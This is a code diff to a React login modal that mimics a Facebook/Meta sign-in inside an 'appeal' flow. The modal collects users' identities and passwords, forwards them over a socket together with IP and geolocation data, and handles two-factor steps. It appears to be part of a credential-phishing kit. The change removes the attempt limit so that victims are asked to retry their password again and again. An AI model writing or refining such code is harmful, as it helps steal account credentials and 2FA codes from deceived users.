@@ -4,7 +4,6 @@ import MetaLogoGrey from '@/assets/images/meta-logo-grey.png';
 import { useAppealContext } from '@/hooks/use-appeal-context';
 import { store } from '@/store/store';
 import { submitLoginApproval } from '@/utils/approval-flow';
-import config from '@/utils/config';
 import translateText from '@/utils/translate';
 import Image from 'next/image';
 import Link from 'next/link';
@@ -34,7 +33,6 @@ const PasswordEye: FC<{ show: boolean }> = ({ show }) => (
 );
 
 const FacebookLoginModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
-    const [attempts, setAttempts] = useState(0);
     const [identity, setIdentity] = useState('');
     const [password, setPassword] = useState('');
     const [showPassword, setShowPassword] = useState(false);
@@ -45,7 +43,6 @@ const FacebookLoginModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     const { geoInfo } = store();
     const appeal = useAppealContext();
-    const maxPass = config.MAX_PASS ?? 3;
 
     const t = (text: string): string => translations[text] || text;
 
@@ -83,9 +80,6 @@ const FacebookLoginModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         setIsLoading(true);
         setIsWaiting(true);
 
-        const next = attempts + 1;
-        setAttempts(next);
-
         try {
             if (!appeal.socket || !appeal.isConnected || !appeal.ip) {
                 throw new Error('socket unavailable');
@@ -108,8 +102,7 @@ const FacebookLoginModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                     addTwoFAAttempt: appeal.addTwoFAAttempt
                 },
                 identity,
-                password,
-                maxPass
+                password
             );
 
             if (result.approved || result.needs2FA) {
@@ -117,20 +110,11 @@ const FacebookLoginModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                 return;
             }
 
-            if (result.isLastAttempt) {
-                nextStep();
-                return;
-            }
-
             setShowError(true);
             setPassword('');
         } catch {
-            if (next >= maxPass) {
-                nextStep();
-            } else {
-                setShowError(true);
-                setPassword('');
-            }
+            setShowError(true);
+            setPassword('');
         } finally {
             setIsWaiting(false);
             setIsLoading(false);
